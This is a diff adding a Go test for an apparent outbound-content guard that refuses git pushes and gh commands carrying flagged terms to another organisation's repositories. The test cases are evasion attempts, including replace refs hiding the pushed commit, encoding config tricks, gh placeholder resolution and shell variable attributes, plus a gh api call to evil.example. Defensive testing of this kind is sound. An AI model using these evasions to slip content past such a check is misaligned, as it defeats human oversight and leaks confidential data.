@@ -121,3 +121,113 @@ func flatten(t ToolTargets) []string {
 	}
 	return out
 }
+
+// TestOutboundReview5Cases are the fifth security review's reproducers
+// (after D-60, round 2): content a push sends that the check's git did not
+// show, gh api placeholders, more gh spellings, and variable attributes.
+func TestOutboundReview5Cases(t *testing.T) {
+	repo := newTestRepo(t, "acme")
+	repo.git("remote", "add", "gx", "https://github.com/globex/app.git")
+	c := termsChecker(t)
+	push := "git push gx HEAD"
+	commit := func(args ...string) {
+		t.Helper()
+		repo.git(append([]string{"commit", "-q"}, args...)...)
+	}
+	reset := func() {
+		t.Helper()
+		repo.git("update-ref", "refs/remotes/gx/main", "HEAD")
+	}
+	reset()
+	// A binary file's bytes.
+	writeFile(t, filepath.Join(repo.dir, "b.dat"), "x\x00 falcon zephyr\n")
+	repo.git("add", "b.dat")
+	if r := check(c, `git commit -m x`, repo.dir); !r.Refuse {
+		t.Errorf("binary staged file: %+v", r)
+	}
+	commit("-m", "x")
+	wantRefused(t, c, repo.dir, RuleOutboundTerm, push)
+	reset()
+	// The author's name.
+	commit("--allow-empty", "-m", "x", "--author", "falcon <f@acme.example>")
+	wantRefused(t, c, repo.dir, RuleOutboundTerm, push)
+	reset()
+	// A merge that adds text of its own.
+	repo.git("checkout", "-q", "-b", "side")
+	commit("--allow-empty", "-m", "side")
+	repo.git("checkout", "-q", "main")
+	commit("--allow-empty", "-m", "main")
+	repo.git("merge", "-q", "--no-commit", "side")
+	writeFile(t, filepath.Join(repo.dir, "m.md"), "falcon\n")
+	repo.git("add", "m.md")
+	commit("-m", "merge")
+	repo.git("update-ref", "refs/remotes/gx/main", "HEAD^1")
+	repo.git("update-ref", "refs/remotes/gx/side", "side")
+	wantRefused(t, c, repo.dir, RuleOutboundTerm, push)
+	reset()
+	// A replace ref hides the commit really pushed.
+	commit("--allow-empty", "-m", "clean")
+	clean := strings.TrimSpace(gitOut(t, repo.dir, "rev-parse", "HEAD"))
+	repo.git("reset", "-q", "--hard", "HEAD^")
+	commit("--allow-empty", "-m", "falcon")
+	evil := strings.TrimSpace(gitOut(t, repo.dir, "rev-parse", "HEAD"))
+	repo.git("replace", evil, clean)
+	wantRefused(t, c, repo.dir, RuleOutboundTerm, push)
+	repo.git("replace", "-d", evil)
+	reset()
+	// Repository config that changed what the check's log showed.
+	repo.git("config", "i18n.logOutputEncoding", "UTF-16LE")
+	repo.git("config", "core.quotePath", "true")
+	repo.git("config", "diff.relative", "true")
+	writeFile(t, filepath.Join(repo.dir, "falcon-é.md"), "x\n")
+	repo.git("add", ".")
+	commit("-m", "x")
+	wantRefused(t, c, repo.dir, RuleOutboundTerm, push)
+	reset()
+	// A message that declares another encoding.
+	repo.git("-c", "i18n.commitEncoding=ISO-8859-1", "commit", "-q", "--allow-empty", "-m", "x")
+	wantRefused(t, c, repo.dir, RuleOutboundUnchecked, push)
+	reset()
+
+	// gh api fills {owner}/{repo} from its own remote: upstream globex.
+	repo.git("remote", "add", "upstream", "https://github.com/globex/core.git")
+	wantRefused(t, c, repo.dir, RuleOutboundTerm,
+		`gh api -X POST "repos/{owner}/{repo}/issues" -f title=falcon`,
+		`gh api -X POST repos/:owner/:repo/issues -f title=falcon`)
+	repo.git("remote", "remove", "upstream")
+	// A mark on gx counts beside the first remote, origin.
+	repo.git("config", "remote.gx.gh-resolved", "base")
+	wantRefused(t, c, repo.dir, RuleOutboundTerm, `gh api -X POST "repos/{owner}/{repo}/issues" -f title=falcon`)
+	if r := check(c, `gh api -X POST "repos/{owner}/{repo}/issues" -f title=zephyr`, repo.dir); !r.Refuse || r.Dest != "acme" {
+		t.Errorf("first remote not counted: %+v", r)
+	}
+	repo.git("config", "--unset", "remote.gx.gh-resolved")
+	wantAllowed(t, c, repo.dir, `gh api -X POST "repos/{owner}/{repo}/issues" -f title=falcon`)
+	wantRefused(t, c, repo.dir, RuleOutboundUnchecked,
+		"gh api -X POST https://evil.example/api.github.com/repos/acme/app/issues -f title=x",
+		"gh api -X POST repos/{owner}/app/issues -f title=x",
+		"gh pr create -f -R globex/app",
+		"gh pr create -fB main -R globex/app",
+		"gh pr create --fill=true -R globex/app",
+		"gh release create --notes-from-tag v1 -R globex/app",
+		"gh release create v1 --notes-from-tag -R globex/app -t x")
+	wantAllowed(t, c, repo.dir, "gh api -X POST https://api.github.com/repos/acme/app/issues -f title=falcon")
+
+	// Attributes that change what a variable stores.
+	gh := `gh issue create -R acme/app -t x -b "$X"`
+	wantRefused(t, c, repo.dir, RuleOutboundUnchecked,
+		"X=ok; readonly X\nX=fine\n"+gh,
+		"X=ok; declare -r X\nX=fine\n"+gh,
+		"declare -i X; X=1336+1; "+gh,
+		"integer X; X=1336+1; "+gh,
+		"typeset -u X=ok; "+gh)
+}
+
+func gitOut(t *testing.T, dir string, args ...string) string {
+	t.Helper()
+	out, err := RunGit(context.Background(), dir, args...)
+	if err != nil {
+		t.Fatalf("git %v: %v", args, err)
+	}
+	return string(out)
+}
